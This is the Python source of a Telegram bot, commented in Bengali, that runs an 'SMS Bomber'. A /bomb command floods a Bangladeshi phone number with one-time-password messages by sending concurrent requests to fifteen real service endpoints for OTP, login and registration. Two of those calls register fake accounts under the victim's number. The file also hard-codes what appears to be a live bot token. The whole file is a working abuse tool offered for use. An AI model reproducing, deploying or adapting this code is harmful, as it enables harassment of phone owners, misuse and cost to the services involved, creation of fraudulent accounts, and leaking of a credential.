import json
import re
import random
import string
import requests
import threading
from flask import Flask, request, jsonify
from concurrent.futures import ThreadPoolExecutor

app = Flask(__name__)

# ------------------- কনফিগারেশন -------------------
BOT_TOKEN = "8624707974:AAEOwXg99cGERJdlbaGQTqxMyg_uWOLWIqE"  # Shitob-এ ডেপ্লয়ের পর বদলাবেন
OWNER_ID = 1700797877
authorized_groups = set()

# ------------------- টেলিগ্রামে মেসেজ পাঠানোর ফাংশন -------------------
def send_message(chat_id, text, parse_mode=None):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {"chat_id": chat_id, "text": text}
    if parse_mode:
        payload["parse_mode"] = parse_mode
    try:
        requests.post(url, json=payload, timeout=5)
    except Exception as e:
        print(f"Send error: {e}")

# ------------------- র‍্যান্ডম স্ট্রিং জেনারেটর -------------------
def random_string(pattern):
    result = []
    i = 0
    while i < len(pattern):
        if pattern[i:i+2] == '?n':
            result.append(str(random.randint(0, 9)))
            i += 2
        elif pattern[i:i+2] == '?l':
            result.append(random.choice(string.ascii_lowercase))
            i += 2
        elif pattern[i:i+2] == '?i':
            result.append(random.choice(string.ascii_letters + string.digits))
            i += 2
        else:
            result.append(pattern[i])
            i += 1
    return ''.join(result)

# ------------------- HTTP রিকোয়েস্ট হেলপার -------------------
def send_req(url, method, headers, data=None):
    try:
        if method == "POST":
            resp = requests.post(url, headers=headers, json=data, timeout=10)
        else:
            resp = requests.get(url, headers=headers, timeout=10)
        return resp
    except:
        return None

# ------------------- ১৫টি এপিআই ফাংশন (আপনার দেওয়া) -------------------
def api_1(number, pgen, egen, did, name):
    url = "https://core.easy.com.bd/api/v1/registration"
    headers = {"Accept-Encoding": "gzip", "Connection": "Keep-Alive", "Content-Type": "application/json; charset=utf-8", "Host": "core.easy.com.bd", "User-Agent": "okhttp/3.9.1"}
    data = {"password": pgen, "password_confirmation": pgen, "device_key": did, "name": name, "mobile": number, "email": f"{egen}info@gmail.com"}
    return send_req(url, "POST", headers, data)

def api_2(number):
    url = "https://training.gov.bd/backoffice/api/user/sendOtp"
    headers = {"Accept-Encoding": "gzip", "Connection": "Keep-Alive", "Content-Type": "application/json; charset=utf-8", "Host": "training.gov.bd", "User-Agent": "okhttp/3.9.1"}
    data = {"mobile": number}
    return send_req(url, "POST", headers, data)

def api_3(number):
    url = "https://auth.qcoom.com/api/v1/otp/send"
    headers = {"Accept-Encoding": "gzip", "Connection": "Keep-Alive", "Content-Type": "application/json; charset=utf-8", "Host": "auth.qcoom.com", "User-Agent": "okhttp/3.9.1"}
    data = {"mobileNumber": f"+88{number}"}
    return send_req(url, "POST", headers, data)

def api_4(number):
    url = "https://api.apex4u.com/api/auth/login"
    headers = {"Accept-Encoding": "gzip", "Connection": "Keep-Alive", "Content-Type": "application/json; charset=utf-8", "Host": "api.apex4u.com", "User-Agent": "okhttp/3.9.1"}
    data = {"phoneNumber": number}
    return send_req(url, "POST", headers, data)

def api_5(number):
    url = "https://api.osudpotro.com/api/v1/users/send_otp"
    headers = {"Accept-Encoding": "gzip", "Connection": "Keep-Alive", "Content-Type": "application/json; charset=utf-8", "Host": "api.osudpotro.com", "User-Agent": "okhttp/3.9.1"}
    data = {"os": "web", "mobile": f"+88-{number}", "language": "en", "deviceToken": "web"}
    return send_req(url, "POST", headers, data)

def api_6(number):
    url = "https://api.busbd.com.bd/api/auth"
    headers = {"Accept-Encoding": "gzip", "Connection": "Keep-Alive", "Content-Type": "application/json; charset=utf-8", "Host": "api.busbd.com.bd", "User-Agent": "okhttp/3.9.1"}
    data = {"phone": f"+88{number}"}
    return send_req(url, "POST", headers, data)

def api_7(number):
    url = "https://bkshopthc.grameenphone.com/api/v1/fwa/request-for-otp"
    headers = {"Accept-Encoding": "gzip", "Connection": "Keep-Alive", "Content-Type": "application/json; charset=utf-8", "Host": "bkshopthc.grameenphone.com", "User-Agent": "okhttp/3.9.1"}
    data = {"phone": number, "language": "en", "email": ""}
    return send_req(url, "POST", headers, data)

def api_8(number):
    url = "https://app.deshal.net/api/auth/login"
    headers = {"Accept-Encoding": "gzip", "Connection": "Keep-Alive", "Content-Type": "application/json; charset=utf-8", "Host": "app.deshal.net", "User-Agent": "okhttp/3.9.1"}
    data = {"phone": number}
    return send_req(url, "POST", headers, data)

def api_9(number):
    url = "https://api-dynamic.chorki.com/v2/auth/login?country=BD&platform=web&language=en"
    headers = {"Accept-Encoding": "gzip", "Connection": "Keep-Alive", "Content-Type": "application/json; charset=utf-8", "Host": "api-dynamic.chorki.com", "User-Agent": "okhttp/3.9.1"}
    data = {"number": f"+88{number}"}
    return send_req(url, "POST", headers, data)

def api_10(number, pgen, egen, name):
    url = "https://regalfurniturebd.com/api/auth/register"
    headers = {"Accept-Encoding": "gzip", "Connection": "Keep-Alive", "Content-Type": "application/json; charset=utf-8", "Host": "regalfurniturebd.com", "User-Agent": "okhttp/3.9.1"}
    data = {"emergency_contact_number": number, "password_confirmation": pgen, "address": "", "address_1": "Dhaka,bd,ch", "address_2": "My,won,home", "telephone": number, "agree": True, "device_name": "web_browser", "password": pgen, "district": "Outside Dhaka", "post_code": "200", "name": name, "company": "dhaka", "email": f"{egen}@gmail.com"}
    return send_req(url, "POST", headers, data)

def api_11(number):
    url = "https://da-api.robi.com.bd/da-nll/otp/send"
    headers = {"Accept-Encoding": "gzip", "Connection": "Keep-Alive", "Content-Type": "application/json; charset=utf-8", "Host": "da-api.robi.com.bd", "User-Agent": "okhttp/3.9.1"}
    data = {"msisdn": number}
    return send_req(url, "POST", headers, data)

def api_12(number):
    url = "https://api.shikho.com/public/activity/otp"
    headers = {"Accept-Encoding": "gzip", "Connection": "Keep-Alive", "Content-Type": "application/json; charset=utf-8", "Host": "api.shikho.com", "User-Agent": "okhttp/3.9.1"}
    data = {"phone": number, "intent": "ap-discount-request"}
    return send_req(url, "POST", headers, data)

def api_13(number):
    url = "https://api.garibookadmin.com/api/v3/user/login"
    headers = {"Accept-Encoding": "gzip", "Connection": "Keep-Alive", "Content-Type": "application/json; charset=utf-8", "Host": "api.garibookadmin.com", "User-Agent": "okhttp/3.9.1"}
    data = {"recaptcha_token": "garibookcaptcha", "mobile": number, "channel": "web"}
    return send_req(url, "POST", headers, data)

def api_14(number):
    url = "https://api.pathao.com/v2/auth/register"
    headers = {"Accept-Encoding": "gzip", "Android-OS": "10", "App-Agent": "ride/android/491", "Connection": "Keep-Alive", "Content-Type": "application/json; charset=utf-8", "Host": "api.pathao.com", "User-Agent": "okhttp/4.12.0"}
    data = {"country_prefix": "880", "national_number": number[1:], "country_id": 1}
    return send_req(url, "POST", headers, data)

def api_15(number):
    url = "https://fundesh.com.bd/api/auth/generateOTP?service_key="
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36", "Pragma": "no-cache", "Accept": "*/*"}
    data = {"msisdn": number[1:]}
    return send_req(url, "POST", headers, data)

# ------------------- বোমা চালানোর ফাংশন (হাই কনকারেন্সি) -------------------
def run_bombing(number, rounds=1):
    apis = [api_2, api_3, api_4, api_5, api_6, api_7, api_8, api_9, api_11, api_12, api_13, api_14, api_15]
    total = 0
    for _ in range(rounds):
        pgen = random_string("?n?n?n?n?n?n?n?n?n?n?n?n")
        egen = random_string("?n?n?n?n?n?n?n?n")
        did = random_string("?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i")
        name = random_string("?l?l?l?l?l?l")
        # শুধু Shitob-এ থ্রেড সংখ্যা আরও বাড়ানো যায় (Vercel-এ 20 ছিল)
        with ThreadPoolExecutor(max_workers=25) as ex:
            futures = [ex.submit(api_1, number, pgen, egen, did, name), ex.submit(api_10, number, pgen, egen, name)]
            futures.extend(ex.submit(api, number) for api in apis)
            for f in futures:
                r = f.result()
                if r and r.status_code == 200:
                    total += 1
    return total

# ------------------- ওয়েবহুক হ্যান্ডলার (সিঙ্ক) -------------------
@app.route("/", methods=["POST"])
def webhook():
    update = request.get_json()
    if not update or "message" not in update:
        return jsonify({"ok": True})
    
    msg = update["message"]
    chat_id = msg["chat"]["id"]
    user_id = msg["from"]["id"]
    text = msg.get("text", "")
    chat_type = msg["chat"]["type"]
    
    # গ্রুপ চেক
    if chat_type != "private" and chat_id not in authorized_groups:
        send_message(chat_id, f"❌ This group is not authorized. Group ID: `{chat_id}`\nAsk owner to /authgroup", parse_mode="Markdown")
        return jsonify({"ok": True})
    
    # কমান্ড প্রসেসিং
    if text == "/start" or text == "/help":
        help_text = (
            "🤖 **SMS Bomber Bot Commands**\n\n"
            "🔹 `/start` or `/help` – Show this help\n"
            "🔹 `/bomb <number> [rounds]` – Send OTP bomb\n"
            "   Example: `/bomb 01712345678`\n"
            "   Example: `/bomb 01712345678 5`\n\n"
            "👑 **Owner only:**\n"
            "🔸 `/authgroup <group_id>` – Authorize a group\n"
            "🔸 `/unauthgroup <group_id>` – Remove authorization\n"
            "🔸 `/listgroups` – List authorized groups\n\n"
            "⚡ Shitob Cloud: Higher timeout, up to 20+ rounds possible.\n"
            "🚀 Each round uses 25 parallel threads for max speed."
        )
        send_message(chat_id, help_text, parse_mode="Markdown")
    
    elif text.startswith("/bomb"):
        parts = text.split()
        if len(parts) < 2:
            send_message(chat_id, "Usage: `/bomb 017XXXXXXXX [rounds]`", parse_mode="Markdown")
            return jsonify({"ok": True})
        number = parts[1]
        if not re.match(r'^01[3-9]\d{8}$', number):
            send_message(chat_id, "❌ Invalid number. Example: 01712345678")
            return jsonify({"ok": True})
        rounds = 1
        if len(parts) > 2 and parts[2].isdigit():
            # Shitob-এ টাইমআউট বেশি, তাই 30 রাউন্ড পর্যন্ত দেওয়া যেতে পারে (ঝুঁকি নিন)
            rounds = min(int(parts[2]), 30)
            if rounds != int(parts[2]):
                send_message(chat_id, "⚠️ Maximum 30 rounds on Shitob Cloud (adjustable).")
        send_message(chat_id, f"💣 Bombing `{number}` with {rounds} round(s)...", parse_mode="Markdown")
        
        def do_bomb():
            success = run_bombing(number, rounds)
            send_message(chat_id, f"✅ Done! {success} successful requests sent to `{number}`.", parse_mode="Markdown")
        thread = threading.Thread(target=do_bomb)
        thread.daemon = True
        thread.start()
    
    elif text.startswith("/authgroup") and user_id == OWNER_ID:
        parts = text.split()
        if len(parts) != 2:
            send_message(chat_id, "Usage: `/authgroup -1001234567890`", parse_mode="Markdown")
            return jsonify({"ok": True})
        try:
            gid = int(parts[1])
            authorized_groups.add(gid)
            send_message(chat_id, f"✅ Group `{gid}` authorized.", parse_mode="Markdown")
        except:
            send_message(chat_id, "Invalid group ID.")
    
    elif text.startswith("/unauthgroup") and user_id == OWNER_ID:
        parts = text.split()
        if len(parts) != 2:
            send_message(chat_id, "Usage: `/unauthgroup -1001234567890`", parse_mode="Markdown")
            return jsonify({"ok": True})
        try:
            gid = int(parts[1])
            authorized_groups.discard(gid)
            send_message(chat_id, f"✅ Group `{gid}` unauthorized.", parse_mode="Markdown")
        except:
            send_message(chat_id, "Invalid group ID.")
    
    elif text == "/listgroups" and user_id == OWNER_ID:
        if not authorized_groups:
            send_message(chat_id, "No authorized groups.")
        else:
            groups = "\n".join(str(g) for g in authorized_groups)
            send_message(chat_id, f"**Authorized groups:**\n{groups}", parse_mode="Markdown")
    
    else:
        send_message(chat_id, "Unknown command. Type `/start` for help.", parse_mode="Markdown")
    
    return jsonify({"ok": True})

@app.route("/", methods=["GET"])
def home():
    return jsonify({"status": "Bomb bot running on Shitob Cloud"})

# Shitob Cloud সাধারণত এই অংশটি উপেক্ষা করে (এরা গুনিকর্ন ব্যবহার করে), কিন্তু রাখলাম
if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8080)
